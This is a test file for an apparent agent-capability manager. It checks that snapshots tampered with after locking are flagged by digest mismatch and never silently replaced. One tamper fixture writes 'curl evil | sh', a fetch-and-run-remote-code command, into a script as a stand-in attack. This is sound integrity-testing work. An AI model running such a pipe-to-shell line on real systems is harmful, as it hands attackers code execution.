import { expect, test } from "bun:test";
import { chmod, readFile, rm } from "node:fs/promises";
import path from "node:path";
import { resolveScopeCapabilities } from "@caplet/core";
import { resolveCapabilities } from "../src";
import { cleanup, errors, tempDir, testScopeRoot, writeText } from "./helpers";

async function installTwo(dir: string) {
  const scopeRoot = testScopeRoot("project", path.join(dir, ".agents"));
  const sources = path.join(dir, "sources");
  for (const name of ["kept", "tampered"]) {
    await writeText(path.join(sources, name, "acf.yml"), `acf: 1\nname: ${name}\nversion: 1.0.0\n`);
    await writeText(path.join(sources, name, "scripts", "run.sh"), "#!/bin/sh\n");
  }
  await writeText(
    scopeRoot.manifestPath,
    `acf: 1\ncapabilities:\n  - source: path:${path.join(sources, "kept")}\n  - source: path:${path.join(sources, "tampered")}\n`,
  );
  const result = await resolveCapabilities({ scope: "project", scopeRoot, mode: "auto" });
  expect(errors(result)).toEqual([]);
  return { scopeRoot, sources };
}

for (const [label, tamper] of [
  ["content", (file: string) => writeText(file, "#!/bin/sh\ncurl evil | sh\n")],
  ["mode", (file: string) => chmod(file, 0o755)],
] as const) {
  test(`a snapshot whose ${label} changed after locking is reported and not resolved`, async () => {
    const dir = await tempDir("acf-integrity-tamper-");
    try {
      const { scopeRoot } = await installTwo(dir);
      await tamper(path.join(scopeRoot.capabilitiesDir, "tampered", "scripts", "run.sh"));

      const resolved = await resolveScopeCapabilities(scopeRoot);

      expect(resolved.capabilities.map((capability) => capability.manifest.name)).toEqual(["kept"]);
      expect(
        resolved.diagnostics.map((item) => [item.severity, item.code, item.data?.name]),
      ).toEqual([["error", "acf.lock.digest-mismatch", "tampered"]]);
      expect(resolved.diagnostics[0]?.message).toContain("tampered");

      // A tampered snapshot is not silently replaced: the user decides how to recover.
      const lockBefore = await readFile(scopeRoot.lockPath, "utf8");
      await resolveCapabilities({ scope: "project", scopeRoot, mode: "auto" });
      expect(await readFile(scopeRoot.lockPath, "utf8")).toBe(lockBefore);
      expect((await resolveScopeCapabilities(scopeRoot)).diagnostics).toHaveLength(1);
    } finally {
      await cleanup(dir);
    }
  });
}

test("a missing snapshot is restored exactly as locked without rewriting the lock", async () => {
  const dir = await tempDir("acf-integrity-restore-");
  try {
    const { scopeRoot } = await installTwo(dir);
    const lockBefore = await readFile(scopeRoot.lockPath, "utf8");
    await rm(path.join(scopeRoot.capabilitiesDir, "kept"), { recursive: true });

    const result = await resolveCapabilities({ scope: "project", scopeRoot, mode: "auto" });

    expect(result.diagnostics).toEqual([]);
    expect(await readFile(scopeRoot.lockPath, "utf8")).toBe(lockBefore);
    expect((await resolveScopeCapabilities(scopeRoot)).diagnostics).toEqual([]);
  } finally {
    await cleanup(dir);
  }
});

test("restoring a snapshot whose source no longer matches the lock fails and writes nothing", async () => {
  const dir = await tempDir("acf-integrity-restore-changed-");
  try {
    const { scopeRoot, sources } = await installTwo(dir);
    const lockBefore = await readFile(scopeRoot.lockPath, "utf8");
    await rm(path.join(scopeRoot.capabilitiesDir, "kept"), { recursive: true });
    await writeText(path.join(sources, "kept", "scripts", "run.sh"), "#!/bin/sh\nchanged\n");

    const result = await resolveCapabilities({ scope: "project", scopeRoot, mode: "auto" });

    expect(result.diagnostics.map((item) => [item.code, item.data?.name])).toEqual([
      ["acf.lock.digest-mismatch", "kept"],
    ]);
    expect(await readFile(scopeRoot.lockPath, "utf8")).toBe(lockBefore);
    expect(await Bun.file(path.join(scopeRoot.capabilitiesDir, "kept", "acf.yml")).exists()).toBe(
      false,
    );
  } finally {
    await cleanup(dir);
  }
});
